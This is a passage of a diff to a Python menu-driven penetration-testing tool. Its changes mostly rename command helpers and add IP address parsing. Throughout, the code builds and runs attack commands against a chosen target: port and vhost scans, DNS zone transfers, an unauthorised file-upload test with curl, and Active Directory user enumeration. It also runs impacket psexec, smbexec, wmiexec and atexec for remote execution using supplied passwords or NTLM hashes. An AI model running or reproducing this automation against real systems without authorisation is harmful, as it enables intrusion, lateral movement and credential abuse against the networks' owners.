-               COM = checkInterface("TIP", COM)
-               networkSweep()
-               checkBIOS()
-            else:
+         TIP = spacePadding(TIP, COL1)        
+      if TIP[:5] == "EMPTY":
+         print("[+] Resetting remote IP address...")
+      else:
+         checkParams = 0
+         count = TIP.count(':')            
+         if count == 6:
+            try:
+               bit1,bit2,bit3,bit4,bit5,bit6,bit7 = TIP.split(":")
+               print("[+] Defualting to internet protocol 6...")
+               IP46 = "-6"
+               checkParams = 1
+            except:
                print("[-] Unknown internet protocol...")
-               TIP = spacePadding("EMPTY", COL1)                         
+               TIP = spacePadding("EMPTY", COL1)                              
+         count = TIP.count(".")         
+         if count == 3:
+            try:
+               bit1,bit2,bit3,bit4 = TIP.split(".")
+               print("[+] Defaulting to internet protocol 4...")
+               IP46 = "-4"
+               checkParams = 1
+            except:
+               print("[-] Unknown internet protocol...")
+               TIP = spacePadding("EMPTY", COL1)                     
+         if checkParams == 1:
+            COM = checkInterface("TIP", COM)
+            networkSweep()
+            checkBIOS()
+         else:
+            print("[-] Unknown internet protocol...")
+            TIP = spacePadding("EMPTY", COL1)                         
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1353,7 +1332,7 @@ while True:
       else:
          POR = BAK
       squidCheck()
-      SKEW = timeSync(SKEW)
+      localTime = ServerSync(localTime)
       prompt()
          
 # ------------------------------------------------------------------------------------- 
@@ -1372,7 +1351,7 @@ while True:
             WEB = spacePadding(WEB, COL1)
          if proxyChains != 1:
             print(colored("[*] Enumerating website url for verbs...", colour3))
-            remotCOM("wfuzz -f verbs.tmp,raw -z list,PUT-DELETE-GET-HEAD-POST-TRACE-OPTIONS -X FUZZ " + WEB.rstrip(" ") + " > temp.tmp 2>&1")
+            runCommand("wfuzz -f verbs.tmp,raw -z list,PUT-DELETE-GET-HEAD-POST-TRACE-OPTIONS -X FUZZ " + WEB.rstrip(" ") + " > temp.tmp 2>&1")
             cutLine("Pycurl is not compiled against Openssl","verbs.tmp")
             cutLine("Target","verbs.tmp")
             cutLine("Total requests","verbs.tmp")
@@ -1387,14 +1366,13 @@ while True:
             print("[-] Proxychains enabled, no verb enumeration available...")
             
          print(colored("\n[*] Checking to see if I can upload a file to this location...", colour3))
-         localCOM("echo '<html>Rogue Agent</html>' > rogue.html")
-         remotCOM("curl " + WEB.strip(" ") + " --upload-file rogue.html 2> test.tmp 1>check.tmp")
+         runCommand("echo '<html>Rogue Agent</html>' > rogue.html")
+         runCommand("curl " + WEB.strip(" ") + " --upload-file rogue.html 2> test.tmp 1>check.tmp")
          errorCheck = linecache.getline("check.tmp", 1)
          if errorCheck == "":
-            print("[+] Looks like it worked!! - manualy check the web browser for /rogue.html...")
+            print("[+] Looks like it might have worked!! - manualy check the web browser for /rogue.html...")
          else:
-            print(colored("\nSomething went wrong!!...", colour6))   
-            
+            print("[-] 404 Not Found...")
       else:
          WEB = BAK
          print("[-] No action has been taken...")   
@@ -1502,11 +1480,11 @@ while True:
          DOM = spacePadding(DOM, COL1)         
          if DOMC == 1:
             print("[+] Removing previous domain name " + BAK.rstrip(" ") + " from /etc/hosts...")
-            localCOM("sed -i '$d' /etc/hosts")
+            runCommand("sed -i '$d' /etc/hosts")
             DOMC = 0            
          if DOMC == 0:
             if DOM[:5] != "EMPTY":
-               localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+               runCommand("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
                print("[+] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
                DOMC = 1
       prompt()
@@ -1607,12 +1585,12 @@ while True:
       if checkParams != 0:
         if HTTP != "":
             print(colored("[*] Specified local service started...", colour3))
-            localCOM("xdotool key Ctrl+Shift+T")
-            localCOM("xdotool key Alt+Shift+S; xdotool type 'LOCAL SERVICE'; xdotool key Return")
+            runCommand("xdotool key Ctrl+Shift+T")
+            runCommand("xdotool key Alt+Shift+S; xdotool type 'LOCAL SERVICE'; xdotool key Return")
             dispBanner("LOCAL SERVICE",0) 
-            localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-            localCOM("xdotool type '" + choice + "'; xdotool key Return")
-            localCOM("xdotool key Ctrl+Tab")         
+            runCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+            runCommand("xdotool type '" + choice + "'; xdotool key Return")
+            runCommand("xdotool key Ctrl+Tab")         
       prompt()    
 
 # ------------------------------------------------------------------------------------- 
@@ -1632,29 +1610,29 @@ while True:
          checkParams = test_DNS()         
          if checkParams != 1:
             print(colored("[*] Checking DNS Server...\n", colour3))         
-            remotCOM("whois -I "  + DNS.rstrip(" "))
+            runCommand("whois -I "  + DNS.rstrip(" "))
       if subChoice == "2":
          checkParams = test_DNS()
          if checkParams != 1:
             checkParams = test_DOM()
          if checkParams != 1:
             print(colored("[*] Checking DNS Server...", colour3))
-#           remotCOM("dig axfr @" + TIP.rstrip(" ") + " " + DOM.rstrip(" "))
-            remotCOM("dig SOA " + DOM.rstrip(" ") + " @" + TIP.rstrip(" "))
+#           runCommand("dig axfr @" + TIP.rstrip(" ") + " " + DOM.rstrip(" "))
+            runCommand("dig SOA " + DOM.rstrip(" ") + " @" + TIP.rstrip(" "))
       if subChoice == "3":
          checkParams = test_DOM()      
          if checkParams != 1:
             print(colored("[*] Checking DOMAIN Server...", colour3))
-            remotCOM("dnsenum " + DOM.rstrip(" "))        
+            runCommand("dnsenum " + DOM.rstrip(" "))        
       if subChoice == "4":
          checkParams = test_TIP()
          if checkParams != 1:
             checkParams = test_DOM()         
          if checkParams != 1:
             print(colored("[*] Checking DOMAIN zone transfer...", colour3))
-            remotCOM("dnsrecon -d " + DOM.rstrip(" ") + " -t axfr")         
+            runCommand("dnsrecon -d " + DOM.rstrip(" ") + " -t axfr")         
             print(colored("[*] Bruteforcing DOMAIN name, please wait this can take sometime...", colour3))
-            remotCOM("dnsrecon -d " + DOM.rstrip(" ") + " -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt")
+            runCommand("dnsrecon -d " + DOM.rstrip(" ") + " -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt")
       if subChoice == "5":
          pass           
       prompt()      
@@ -1671,7 +1649,7 @@ while True:
       PTS = checkPorts(PTS, POR)
       POR = spacePadding(PTS, COL1)      
       squidCheck()
-      SKEW = timeSync(SKEW)
+      localTime = ServerSync(localTime)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1687,8 +1665,7 @@ while True:
       if checkParams != 1:
          if POR[:5] != "EMPTY":
             print(colored("[*] Scanning specified live ports only, please wait this may take sometime...", colour3))
-#            print("[+] Performing light scan...")            
-            remotCOM("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " -sV -O -A -T4 --version-all --reason --script=banner,discovery,auth " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
+            runCommand("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " -sV -O -A -T4 --version-all --reason --script=banner,discovery,auth " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
             nmapTrim("light.tmp")            
             service = linecache.getline("service.tmp", 1)
             if "WINDOWS" in service.upper():
@@ -1703,28 +1680,9 @@ while True:
                OSF = spacePadding("IOS", COL1)   
             parsFile("light.tmp")
             catsFile("light.tmp")            
- #           print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")         
- #           print("[+] Performing heavy scan...")
- #           remotCOM("nmap " + IP46 + " -p " + PTS.rstrip(" ") + " -sV -O -A -T4 --version-all --reason --script=discovery,auth " + TIP.rstrip(" ") + " -oN heavy.tmp 2>&1 > temp.tmp")
- #           localCOM("sed -i '/# Nmap/d' heavy.tmp")            
- #           catsFile("heavy.tmp")                   
             if "500" in PTS:
-               remotCOM("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
+               runCommand("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
                catsFile("ike.tmp")
-#         else:
-#            print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3))
-#            print("[+] Performing light scan...")
-#            remotCOM("nmap " + IP46 + " -p-  -sV -O -A -T4 --version-all --reason --script=banner,discovery,auth " + TIP.rstrip(" ") + " -oN light.tmp 2>&1 > temp.tmp")
-#            nmapTrim("light.tmp")
-#            parsFile("light.tmp")
-#            catsFile("light.tmp")
-#            print("[+] Performing heavy scan...")
-#            remotCOM("nmap " + IP46 + " -sT -sU -sV -Pn --reason --script=discovery,auth " + TIP.rstrip(" ") + " -oN heavy.tmp 2>&1 > temp.tmp")
-#            localCOM("sed -i '/# Nmap/d' heavy.tmp")                       
-#            catsFile("heavy.tmp")
-#            if "500," in PTS:
-#               remotCOM("ike-scan -M " + TIP.rstrip(" ") + " -oN ike.tmp 2>&1 > temp.tmp")
-#               catsFile("ike.tmp")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1740,8 +1698,8 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()         
       if checkParams != 1:
-            print(colored("[*] Scanning for subdomains, please wait this can take sometime...", colour3))
-            remotCOM("gobuster dns -q --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 --resolver " + DNS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -i")
+         print(colored("[*] Scanning for subdomains, please wait this can take sometime...", colour3))
+         runCommand("gobuster dns -q --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 --resolver " + DNS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -i -o found.tmp")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1756,7 +1714,7 @@ while True:
       checkParams = test_WEB()
       if checkParams != 1:
          print(colored("[*] Scanning for vhosts, please wait this can take sometime...", colour3))
-         remotCOM("gobuster vhost -q -r -u " + WEB.rstrip(" ") + " -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100")
+         runCommand("gobuster vhost -q -r -u " + WEB.rstrip(" ") + " -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' --wordlist=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -o found.tmp")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1769,7 +1727,7 @@ while True:
 
    if selection == '20':
       print(colored("[*] Attempting to enumerate vulnerable plugins...", colour3))
-      remotCOM("wpscan --url " + WEB.rstrip(" ") + " --enumerate u,ap,vt,dbe,cb --plugins-detection mixed")
+      runCommand("wpscan --url " + WEB.rstrip(" ") + " --enumerate u,ap,vt,dbe,cb --plugins-detection mixed")
       prompt()
                   
 # ------------------------------------------------------------------------------------- 
@@ -1785,7 +1743,7 @@ while True:
       checkParams = test_TIP()      
       if checkParams != 1:
          print(colored("[*] Attempting to enumerate architecture...", colour3))
-         remotCOM(keyPath + "getArch.py -target " + TIP.rstrip(" ") + " > os.tmp")                 
+         runCommand(keyPath + "getArch.py -target " + TIP.rstrip(" ") + " > os.tmp")                 
          with open("os.tmp") as read:
             for arch in read:
                if "is" in arch:
@@ -1809,7 +1767,7 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()      
       if checkParams != 1:
-         remotCOM(keyPath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -target " + TIP.rstrip(" "))
+         runCommand(keyPath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -target " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1825,7 +1783,7 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()      
       if checkParams != 1:
-         remotCOM(keyPath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " list")
+         runCommand(keyPath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " list")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1841,7 +1799,7 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()      
       if checkParams != 1:
-         remotCOM(keyPath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " whoami /all")
+         runCommand(keyPath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " whoami /all")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1857,7 +1815,7 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()               
       if checkParams != 1:
-         remotCOM(keyPath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
+         runCommand(keyPath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1873,7 +1831,7 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()               
       if checkParams != 1:
-         remotCOM(keyPath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
+         runCommand(keyPath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1889,7 +1847,7 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()            
       if checkParams != 1:
-         remotCOM(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
+         runCommand(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1905,7 +1863,7 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()      
       if checkParams != 1:
-         remotCOM(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
+         runCommand(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1921,8 +1879,8 @@ while True:
       if checkParams != 1:
          checkParams = test_PRT("2049")
          if checkParams != 1:
-            remotCOM("showmount -e " + TIP.rstrip(" ") + " > mount.tmp")
-            localCOM("sed -i '/Export list for/d' mount.tmp")                  
+            runCommand("showmount -e " + TIP.rstrip(" ") + " > mount.tmp")
+            runCommand("sed -i '/Export list for/d' mount.tmp")                  
             if os.path.getsize("mount.tmp") > 0:
                print("[+] NFS exports found...\n")            
                with open("mount.tmp") as read:
@@ -1949,8 +1907,8 @@ while True:
          if checkParams != 1:
             mount = input("[?] Please enter NFS name : ")         
             if not os.path.exists(mount):
-               localCOM("mkdir " + mount)
-            remotCOM("mount -o nolock -t nfs " + TIP.rstrip(" ") + ":/" + mount + " " + mount + "/")
+               runCommand("mkdir " + mount)
+            runCommand("mount -o nolock -t nfs " + TIP.rstrip(" ") + ":/" + mount + " " + mount + "/")
             print("[+] NFS " + mount + " mounted...")
       prompt()
 
@@ -1968,21 +1926,21 @@ while True:
          checkParams = test_DOM()                  
       if checkParams != 1:
             print(colored("[*] Enumerating DNS zones...", colour3))
-            remotCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")
+            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")
             print(colored("\n[*] Enumerating domain admins...", colour3))
-            remotCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")                  
+            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")                  
             print(colored("\n[*] Enumerating admin protected objects...", colour3))
-            remotCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                           
+            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                           
             print(colored("\n[*] Enumerating domain users...", colour3))
-            remotCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")         
+            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")         
             print(colored("\n[*] Enumerating remote management users...",colour3))
-            remotCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")                  
+            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")                  
             print(colored("\n[*] Enumerating users with unconstrained delegation...", colour3))
-            remotCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
+            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
             print(colored("\n[*] Enumerating domain groups...", colour3))
-            remotCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")        
+            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")        
             print(colored("\n[*] Enumerating AD computers...", colour3))
-            remotCOM(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
+            runCommand(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1999,8 +1957,8 @@ while True:
          checkParams = test_DOM()               
       if checkParams != 1:
          print(colored("[*] Enumerating, please wait....", colour3))
-         remotCOM(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > domain.tmp")                  
-         localCOM("cat domain.tmp | grep 'Domain SID' > sid.tmp")         
+         runCommand(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > domain.tmp")                  
+         runCommand("cat domain.tmp | grep 'Domain SID' > sid.tmp")         
          with open("sid.tmp", "r") as read:
             line1 =  read.readline()            
          if "Domain SID is:" in line1:
@@ -2010,14 +1968,14 @@ while True:
             SID = spacePadding(SID, COL1)               
          else:
             print("[+] Unable to find domain SID...")                         
-         localCOM("sed -i /*/d domain.tmp")
-         localCOM("sed -i 's/.*://g' domain.tmp")   
-         localCOM("cat domain.tmp | grep SidTypeAlias | sort > alias.tmp")      
-         localCOM("cat domain.tmp | grep SidTypeGroup | sort > group.tmp")
-         localCOM("cat domain.tmp | grep SidTypeUser  | sort > users.tmp")         
-         localCOM("sed -i 's/(SidTypeAlias)//g' alias.tmp")
-         localCOM("sed -i 's/(SidTypeGroup)//g' group.tmp")
-         localCOM("sed -i 's/(SidTypeUser)//g'  users.tmp")                           
+         runCommand("sed -i /*/d domain.tmp")
+         runCommand("sed -i 's/.*://g' domain.tmp")   
+         runCommand("cat domain.tmp | grep SidTypeAlias | sort > alias.tmp")      
+         runCommand("cat domain.tmp | grep SidTypeGroup | sort > group.tmp")
+         runCommand("cat domain.tmp | grep SidTypeUser  | sort > users.tmp")         
+         runCommand("sed -i 's/(SidTypeAlias)//g' alias.tmp")
+         runCommand("sed -i 's/(SidTypeGroup)//g' group.tmp")
+         runCommand("sed -i 's/(SidTypeUser)//g'  users.tmp")                           
          if os.path.getsize("alias.tmp") != 0:
             print("[+] Found Aliases...\n")
             catsFile("alias.tmp")
@@ -2034,9 +1992,9 @@ while True:
          else:
             print("[+] Unable to find usernames...")                              
          if os.path.getsize("users.tmp") != 0:
-            localCOM("rm " + dataDir + "/usernames.txt")
-            localCOM("rm " + dataDir + "/hashes.txt")
-            localCOM("touch " + dataDir + "/hashes.txt")
+            runCommand("rm " + dataDir + "/usernames.txt")
+            runCommand("rm " + dataDir + "/hashes.txt")
+            runCommand("touch " + dataDir + "/hashes.txt")
             wipeTokens(VALD)                     
             with open("users.tmp", "r") as read:
                for x in range(0, maxUser):
@@ -2048,7 +2006,7 @@ while True:
                      except ValueError:
                         USER[x] = "Error..."
                      USER[x] = spacePadding(USER[x], COL3)
-                     localCOM("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
+                     runCommand("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                   else:
                      USER[x] = " "*COL3
       prompt()
@@ -2069,9 +2027,9 @@ while True:
          print(colored("[*] Enumerating users, please wait this can take sometime...", colour3))         
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password authentication...\n")
-            remotCOM(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " > users.tmp")
+            runCommand(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " > users.tmp")
          else:
-            remotCOM(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > users.tmp")         
+            runCommand(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > users.tmp")         
          count = lineCount("users.tmp")         
          if count > 0:
             with open("users.tmp", "r") as read:
@@ -2079,14 +2037,14 @@ while True:
                   line = read.readline()
                   if "[-] SMB SessionError:" in line:
                      checkParams = 1
-                     localCOM("cat users.tmp")
+                     runCommand("cat users.tmp")
                      break                                 
          if checkParams != 1:
-            localCOM("rm " + dataDir + "/usernames.txt")          
-            localCOM("rm " + dataDir + "/hashes.txt")                        
-            localCOM("touch " + dataDir + "/hashes.txt")                      
-            localCOM("sed -i -n '/Found user: /p' users.tmp")
-            localCOM("cat users.tmp | sort > users2.tmp")            
+            runCommand("rm " + dataDir + "/usernames.txt")          
+            runCommand("rm " + dataDir + "/hashes.txt")                        
+            runCommand("touch " + dataDir + "/hashes.txt")                      
+            runCommand("sed -i -n '/Found user: /p' users.tmp")
+            runCommand("cat users.tmp | sort > users2.tmp")            
             wipeTokens(VALD)            
             print("[+] Found usernames...\n")            
             with open("users2.tmp", "r") as read:
@@ -2099,7 +2057,7 @@ while True:
                      USER[x] = spacePadding(USER[x], COL3)                                          
                      if USER[x] != "":
                        print(colored(USER[x],colour6))
-                       localCOM("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
+                       runCommand("echo " + USER[x] + " >> " + dataDir + "/usernames.txt")
                        HASH[x] = " "*COL4
                      else:
                         USER[x] = " "*COL3
@@ -2134,10 +2092,10 @@ while True:
                registryKeys()
             else:
                if NTM[:5] != "EMPTY" and registryKey.lower() != "quit": 
-                  remotCOM(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
+                  runCommand(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
                else:
                   if registryKey.lower() != "quit":
-                     remotCOM(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
+                     runCommand(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
       prompt()
             
 # ------------------------------------------------------------------------------------- 
@@ -2153,21 +2111,21 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()      
       if checkParams != 1:
-         remotCOM(keyPath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
+         runCommand(keyPath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
 
       stringBindings = input("[?] Enter a valid stringbinding value, such as 'ncacn_ip_tcp:" + DOM.rstrip(" ") + "[135]' : ")            
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[!] Using HASH value as defualt password...")
             if "135" in PTS:
-               remotCOM(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + stringBindings)
+               runCommand(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + stringBindings)
             if "443" in PTS:
-               remotCOM(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
+               runCommand(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
          else:
             if "135" in PTS:
-               remotCOM(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " " + stringBindings)
+               runCommand(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " " + stringBindings)
             if "443" in PTS:
-               remotCOM(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
